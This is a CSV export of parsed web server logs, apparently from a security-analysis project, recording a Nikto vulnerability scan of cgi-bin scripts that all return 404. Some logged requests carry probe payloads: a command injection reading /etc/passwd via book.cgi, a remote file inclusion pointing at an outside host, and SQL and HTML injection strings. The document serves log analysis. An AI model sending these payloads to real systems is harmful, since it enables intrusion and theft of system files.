CHANGE,CODE,CONFIG,Digits,FILE,HELP,HTMLVER,"HTML_FILE",Image,ImageName,NEXTPAGE,Page,QALIAS,QNikto,Qname,"_raw","_time",action,app,az,basehref,branch,bytes,c,calbirthdays,"cart_id",cartid,cartname,category,classification,clientip,comma,command,cookie,cvsroot,date,"date_hour","date_mday","date_minute","date_month","date_second","date_wday","date_year","date_zone",day,desc,"dest_ip","dest_port",dn,etype,eventtype,file,filename,folder,foot,forum,"generator_id",head,host,hours,ident,index,key,linecount,method,module,name,next,other,pa,page,param1,passurl,person,priority,proto,protocol,punct,query,referer,"referer_domain","req_time",root,sd,setup,severity,signature,"signature_rev",sortby,source,sourcetype,"splunk_server","splunk_server_group","src_ip","src_port",status,tag,"tag::eventtype",template,timeendpos,timestartpos,uri,"uri_domain","uri_path","uri_query",user,useragent,version,view,who
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:19 -0700] ""GET /cgi-bin/badmin.cgi HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000189)""","2014-05-08T15:20:19.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,19,thursday,2014,"-420",,,,,,,,"badmin.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:19 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/badmin.cgi",,"/cgi-bin/badmin.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000189)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:19 -0700] ""GET /cgi-bin/astrocam.cgi HTTP/1.1"" 404 317 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000188)""","2014-05-08T15:20:19.000-0700",,,,,,317,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,19,thursday,2014,"-420",,,,,,,,"astrocam.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:19 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/astrocam.cgi",,"/cgi-bin/astrocam.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000188)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:19 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/ezboard.cgi","2014-05-08T15:20:19.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,19,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:19 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/ezadmin.cgi","2014-05-08T15:20:19.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,19,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:19 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/boozt","2014-05-08T15:20:19.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,19,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:19 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/badmin.cgi","2014-05-08T15:20:19.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,19,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:19 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/astrocam.cgi","2014-05-08T15:20:19.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,19,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:16 -0700] ""GET /cgi-bin/moin.cgi?test HTTP/1.1"" 404 313 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000136)""","2014-05-08T15:20:16.000-0700",,,,,,313,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,16,thursday,2014,"-420",,,,,,,,"moin.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?_/.""___""-""_""/._(/..)_(:)_",,"-",,"08/May/2014:15:20:16 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/moin.cgi?test",,"/cgi-bin/moin.cgi",test,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000136)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:16 -0700] ""GET /cgi-bin/cgiwrap/%3Cfont%20color=red%3E HTTP/1.1"" 404 335 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000135)""","2014-05-08T15:20:16.000-0700",,,,,,335,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,16,thursday,2014,"-420",,,,,,,,"%3Cfont%20color=red%3E",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//%%=%_/.""___""-""_""/._(/..)_(",,"-",,"08/May/2014:15:20:16 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/cgiwrap/%3Cfont%20color=red%3E",,"/cgi-bin/cgiwrap/%3Cfont%20color=red%3E",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000135)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:16 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/moin.cgi","2014-05-08T15:20:16.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,16,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:16 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/cgiwrap","2014-05-08T15:20:16.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,16,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:15 -0700] ""GET /cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1"" 404 349 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000108)""","2014-05-08T15:20:15.000-0700",,,,,,349,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,15,thursday,2014,"-420",,,,,,,,"class.atkdateattribute.js.php",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-///...?=://./.?_/.""___""-""_""/",,"-",,"08/May/2014:15:20:15 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?",,"/cgi-bin/atk/javascript/class.atkdateattribute.js.php","config_atkroot=http://cirt.net/rfiinc.txt?","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000108)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:15 -0700] ""GET /cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1"" 404 349 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000108)""","2014-05-08T15:20:15.000-0700",,,,,,349,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,15,thursday,2014,"-420",,,,,,,,"class.atkdateattribute.js.php",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-///...?=://./.?_/.""___""-""_""/",,"-",,"08/May/2014:15:20:15 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?",,"/cgi-bin/atk/javascript/class.atkdateattribute.js.php","config_atkroot=http://cirt.net/rfiinc.txt?","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000108)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:15 -0700] ""GET /cgi-bin/blog/mt-load.cgi HTTP/1.1"" 404 321 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000107)""","2014-05-08T15:20:15.000-0700",,,,,,321,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,15,thursday,2014,"-420",,,,,,,,"mt-load.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//-._/.""___""-""_""/._(/..)_(:)",,"-",,"08/May/2014:15:20:15 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/blog/mt-load.cgi",,"/cgi-bin/blog/mt-load.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000107)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:15 -0700] ""GET /cgi-bin/blog/ HTTP/1.1"" 404 310 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000105)""","2014-05-08T15:20:15.000-0700",,,,,,310,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,15,thursday,2014,"-420",,,,,,,,,,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//_/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:15 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/blog/",,"/cgi-bin/blog/",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000105)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:15 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/atk","2014-05-08T15:20:15.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,15,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:15 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/atk","2014-05-08T15:20:15.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,15,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:15 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/blog","2014-05-08T15:20:15.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,15,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:15 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/blog","2014-05-08T15:20:15.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,15,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:14 -0700] ""GET /cgi-bin/bizdb1-search.cgi HTTP/1.1"" 404 322 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000104)""","2014-05-08T15:20:14.000-0700",,,,,,322,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,14,thursday,2014,"-420",,,,,,,,"bizdb1-search.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/-._/.""___""-""_""/._(/..)_(:)_",,"-",,"08/May/2014:15:20:14 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/bizdb1-search.cgi",,"/cgi-bin/bizdb1-search.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000104)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:14 -0700] ""GET /cgi-bin/architext_query.pl HTTP/1.1"" 404 323 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000103)""","2014-05-08T15:20:14.000-0700",,,,,,323,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,14,thursday,2014,"-420",,,,,,,,"architext_query.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:14 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/architext_query.pl",,"/cgi-bin/architext_query.pl",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000103)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:14 -0700] ""GET /cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10 HTTP/1.1"" 404 313 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000101)""","2014-05-08T15:20:14.000-0700",default,,,,,313,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,14,thursday,2014,"-420",,,,,,,,"book.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?=&=|%//|&=&=.&=_/.""___""-""",,"-",,"08/May/2014:15:20:14 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10",,"/cgi-bin/book.cgi","action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000101)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:14 -0700] ""GET /cgi-bin/bannereditor.cgi HTTP/1.1"" 404 321 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000100)""","2014-05-08T15:20:14.000-0700",,,,,,321,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,14,thursday,2014,"-420",,,,,,,,"bannereditor.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:14 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/bannereditor.cgi",,"/cgi-bin/bannereditor.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000100)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:14 -0700] ""GET /cgi-bin/banner.cgi HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000099)""","2014-05-08T15:20:14.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,14,thursday,2014,"-420",,,,,,,,"banner.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:20:14 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/banner.cgi",,"/cgi-bin/banner.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000099)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:14 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/bizdb1-search.cgi","2014-05-08T15:20:14.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,14,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/-.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:14 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/architext_query.pl","2014-05-08T15:20:14.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,14,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:14 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/book.cgi","2014-05-08T15:20:14.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,14,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:14 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/bannereditor.cgi","2014-05-08T15:20:14.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,14,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:20:14 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/banner.cgi","2014-05-08T15:20:14.000-0700",,,,,,,,,,,,,,,,,,,,15,8,20,may,14,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:13 -0700] ""GET /cgi-bin/mt/mt-check.cgi HTTP/1.1"" 404 320 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000091)""","2014-05-08T15:20:13.000-0700",,,,,,320,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,13,thursday,2014,"-420",,,,,,,,"mt-check.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//-._/.""___""-""_""/._(/..)_(:)",,"-",,"08/May/2014:15:20:13 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/mt/mt-check.cgi",,"/cgi-bin/mt/mt-check.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000091)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:13 -0700] ""GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1"" 404 327 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000090)""","2014-05-08T15:20:13.000-0700",,,,,,327,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,13,thursday,2014,"-420",,,,,,,,"mt-check.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/-/-._/.""___""-""_""/._(/..)_(:",,"-",,"08/May/2014:15:20:13 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/mt-static/mt-check.cgi",,"/cgi-bin/mt-static/mt-check.cgi",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000090)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:13 -0700] ""GET /cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words= HTTP/1.1"" 404 313 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000089)""","2014-05-08T15:20:13.000-0700",,,,,,313,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,13,thursday,2014,"-420",,,,,,,,htsearch,,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/?=&=&=&=&=-&=&=_/.""___""-""_""",,"-",,"08/May/2014:15:20:13 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=",,"/cgi-bin/htsearch","config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000089)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:13 -0700] ""GET /cgi-bin/cart.pl?db=' HTTP/1.1"" 404 312 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000088)""","2014-05-08T15:20:13.000-0700",,,,,,312,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,13,thursday,2014,"-420",,,,,,,,"cart.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?='_/.""___""-""_""/._(/..)_(:",,"-",,"08/May/2014:15:20:13 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/cart.pl?db='",,"/cgi-bin/cart.pl","db='","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000088)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:20:13 -0700] ""GET /cgi-bin/cart.pl?db=' HTTP/1.1"" 404 312 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000087)""","2014-05-08T15:20:13.000-0700",,,,,,312,,,,,,,,"24.84.224.154",,,,,,15,8,20,may,13,thursday,2014,"-420",,,,,,,,"cart.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?='_/.""___""-""_""/._(/..)_(:",,"-",,"08/May/2014:15:20:13 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/cart.pl?db='",,"/cgi-bin/cart.pl","db='","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000087)","HTTP/1.1",,
